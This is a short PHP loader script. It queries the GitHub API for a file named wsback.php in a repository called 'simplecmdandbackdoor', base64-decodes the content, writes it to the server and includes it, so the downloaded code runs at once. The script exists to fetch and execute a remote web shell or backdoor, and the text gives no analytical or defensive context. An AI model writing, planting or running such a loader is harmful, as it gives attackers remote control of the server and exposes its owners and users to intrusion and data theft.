<?php
$url = 'https://api.github.com/repos/Yucaerin/simplecmdandbackdoor/contents/wsback.php';

$opts = [
    "http" => [
        "header" => "User-Agent: PHP"
    ]
];
$context = stream_context_create($opts);
$data = file_get_contents($url, false, $context);

$json = json_decode($data, true);
$fileContent = base64_decode($json['content']);

file_put_contents('wsback.php', $fileContent);
include('wsback.php');
?>
